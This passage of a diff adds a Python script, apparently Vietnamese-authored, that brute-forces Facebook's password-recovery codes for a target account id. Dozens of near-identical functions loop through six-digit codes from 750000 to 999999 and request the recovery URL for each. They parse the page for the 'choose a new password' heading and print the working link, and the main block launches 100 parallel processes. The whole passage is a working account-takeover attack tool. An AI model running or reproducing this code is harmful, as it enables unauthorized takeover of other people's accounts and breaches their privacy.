+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e7():
+    a=7
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (750000,760000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g7():
+    a=7
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (760000,770000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h7():
+    a=7
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (770000,780000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k7():
+    a=7
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (780000,790000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j7():
+    a=7
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (790000,800000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a8():
+    a=8
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (800000,810000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b8():
+    a=8
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (810000,820000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f8():
+    a=8
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (820000,830000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c8():
+    a=8
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (830000,840000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d8():
+    a=8
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (840000,850000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e8():
+    a=8
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (850000,860000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g8():
+    a=8
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (860000,870000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h8():
+    a=8
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (870000,880000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k8():
+    a=8
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (880000,890000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j8():
+    a=8
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (890000,900000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a9():
+    a=9
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (900000,910000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b9():
+    a=9
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (910000,920000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f9():
+    a=9
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (920000,930000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c9():
+    a=9
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (930000,940000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d9():
+    a=9
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (940000,950000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e9():
+    a=9
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (950000,960000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g9():
+    a=9
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (960000,970000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h9():
+    a=9
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (970000,980000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k9():
+    a=9
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (980000,990000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j9():
+    a=9
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (990000,1000000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+if __name__ == "__main__":
+    p1 = multiprocessing.Process(target=task_a)
+    p2 = multiprocessing.Process(target=task_b)
+    p3 = multiprocessing.Process(target=task_c)
+    p4 = multiprocessing.Process(target=task_d)
+    p5 = multiprocessing.Process(target=task_e)
+    p6 = multiprocessing.Process(target=task_f)
+    p7 = multiprocessing.Process(target=task_g)
+    p8 = multiprocessing.Process(target=task_h)
+    p9 = multiprocessing.Process(target=task_k)
+    p10 = multiprocessing.Process(target=task_j)
+    #khoi1
+    p11 = multiprocessing.Process(target=task_a1)
+    p12 = multiprocessing.Process(target=task_b1)
+    p13 = multiprocessing.Process(target=task_c1)
+    p14 = multiprocessing.Process(target=task_d1)
+    p15 = multiprocessing.Process(target=task_e1)
+    p16 = multiprocessing.Process(target=task_f1)
+    p17 = multiprocessing.Process(target=task_g1)
+    p18 = multiprocessing.Process(target=task_h1)
+    p19 = multiprocessing.Process(target=task_k1)
+    p20 = multiprocessing.Process(target=task_j1)
+    #khoi2
+    p21 = multiprocessing.Process(target=task_a2)
+    p22 = multiprocessing.Process(target=task_b2)
+    p23 = multiprocessing.Process(target=task_c2)
+    p24 = multiprocessing.Process(target=task_d2)
+    p25 = multiprocessing.Process(target=task_e2)
+    p26 = multiprocessing.Process(target=task_f2)
+    p27 = multiprocessing.Process(target=task_g2)
+    p28 = multiprocessing.Process(target=task_h2)
+    p29 = multiprocessing.Process(target=task_k2)
+    p30 = multiprocessing.Process(target=task_j2)
+    #khoi3
+    p31 = multiprocessing.Process(target=task_a3)
+    p32 = multiprocessing.Process(target=task_b3)
+    p33 = multiprocessing.Process(target=task_c3)
+    p34 = multiprocessing.Process(target=task_d3)
+    p35 = multiprocessing.Process(target=task_e3)
+    p36 = multiprocessing.Process(target=task_f3)
+    p37 = multiprocessing.Process(target=task_g3)
+    p38 = multiprocessing.Process(target=task_h3)
+    p39 = multiprocessing.Process(target=task_k3)
+    p40 = multiprocessing.Process(target=task_j3)
+    #khoi4
+    p41 = multiprocessing.Process(target=task_a4)
+    p42 = multiprocessing.Process(target=task_b4)
+    p43 = multiprocessing.Process(target=task_c4)
+    p44 = multiprocessing.Process(target=task_d4)
+    p45 = multiprocessing.Process(target=task_e4)
+    p46 = multiprocessing.Process(target=task_f4)
+    p47 = multiprocessing.Process(target=task_g4)
+    p48 = multiprocessing.Process(target=task_h4)
+    p49 = multiprocessing.Process(target=task_k4)
+    p50 = multiprocessing.Process(target=task_j4)
+    #khoi5
+    p51 = multiprocessing.Process(target=task_a5)
+    p52 = multiprocessing.Process(target=task_b5)
+    p53 = multiprocessing.Process(target=task_c5)
+    p54 = multiprocessing.Process(target=task_d5)
+    p55 = multiprocessing.Process(target=task_e5)
+    p56 = multiprocessing.Process(target=task_f5)
+    p57 = multiprocessing.Process(target=task_g5)
+    p58 = multiprocessing.Process(target=task_h5)
+    p59 = multiprocessing.Process(target=task_k5)
+    p60 = multiprocessing.Process(target=task_j5)
+    #khoi6
+    p61 = multiprocessing.Process(target=task_a6)
+    p62 = multiprocessing.Process(target=task_b6)
+    p63 = multiprocessing.Process(target=task_c6)
+    p64 = multiprocessing.Process(target=task_d6)
+    p65 = multiprocessing.Process(target=task_e6)
+    p66 = multiprocessing.Process(target=task_f6)
+    p67 = multiprocessing.Process(target=task_g6)
+    p68 = multiprocessing.Process(target=task_h6)
+    p69 = multiprocessing.Process(target=task_k6)
+    p70 = multiprocessing.Process(target=task_j6)
+    #khoi7
+    p71 = multiprocessing.Process(target=task_a7)
+    p72 = multiprocessing.Process(target=task_b7)
+    p73 = multiprocessing.Process(target=task_c7)
+    p74 = multiprocessing.Process(target=task_d7)
+    p75 = multiprocessing.Process(target=task_e7)
+    p76 = multiprocessing.Process(target=task_f7)
+    p77 = multiprocessing.Process(target=task_g7)
+    p78 = multiprocessing.Process(target=task_h7)
+    p79 = multiprocessing.Process(target=task_k7)
+    p80 = multiprocessing.Process(target=task_j7)
+    #khoi8
+    p81 = multiprocessing.Process(target=task_a8)
+    p82 = multiprocessing.Process(target=task_b8)
+    p83 = multiprocessing.Process(target=task_c8)
+    p84 = multiprocessing.Process(target=task_d8)
+    p85 = multiprocessing.Process(target=task_e8)
+    p86 = multiprocessing.Process(target=task_f8)
+    p87 = multiprocessing.Process(target=task_g8)
+    p88 = multiprocessing.Process(target=task_h8)
+    p89 = multiprocessing.Process(target=task_k8)
+    p90 = multiprocessing.Process(target=task_j8)
+    #khoi9
+    p91 = multiprocessing.Process(target=task_a9)
+    p92 = multiprocessing.Process(target=task_b9)
+    p93 = multiprocessing.Process(target=task_c9)
+    p94 = multiprocessing.Process(target=task_d9)
+    p95 = multiprocessing.Process(target=task_e9)
+    p96 = multiprocessing.Process(target=task_f9)
+    p97 = multiprocessing.Process(target=task_g9)
+    p98 = multiprocessing.Process(target=task_h9)
+    p99 = multiprocessing.Process(target=task_k9)
+    p100 = multiprocessing.Process(target=task_j9)
+    #lenhstart
+    p1.start()
+    p2.start()
+    p3.start()
+    p4.start()
+    p5.start()
+    p6.start()
+    p7.start()
+    p8.start()
+    p9.start()
+    p10.start()
+    p11.start()
+    p12.start()
+    p13.start()
+    p14.start()
+    p15.start()
+    p16.start()
+    p17.start()
+    p18.start()
+    p19.start()
+    p20.start()
+    p21.start()
+    p22.start()
+    p23.start()
+    p24.start()
+    p25.start()
+    p26.start()
+    p27.start()
+    p28.start()
+    p29.start()
+    p30.start()
+    p31.start()
+    p32.start()
+    p33.start()
+    p34.start()
+    p35.start()
+    p36.start()
+    p37.start()
+    p38.start()
+    p39.start()
+    p40.start()
+    p41.start()
+    p42.start()
+    p43.start()
+    p44.start()
+    p45.start()
+    p46.start()
+    p47.start()
+    p48.start()
+    p49.start()
+    p50.start()
+    p51.start()
+    p52.start()
+    p53.start()
+    p54.start()
+    p55.start()
+    p56.start()
+    p57.start()
+    p58.start()
+    p59.start()
+    p60.start()
+    p61.start()
+    p62.start()
+    p63.start()
+    p64.start()
+    p65.start()
+    p66.start()
+    p67.start()
+    p68.start()
+    p69.start()
+    p70.start()
+    p71.start()
+    p72.start()
+    p73.start()
+    p74.start()
+    p75.start()
+    p76.start()
+    p77.start()
+    p78.start()
+    p79.start()
+    p80.start()
+    p81.start()
+    p82.start()
+    p83.start()
+    p84.start()
+    p85.start()
+    p86.start()
+    p87.start()
+    p88.start()
+    p89.start()
+    p90.start()
+    p91.start()
+    p92.start()
+    p93.start()
+    p94.start()
+    p95.start()
+    p96.start()
+    p97.start()
+    p98.start()
+    p99.start()
+    p100.start()
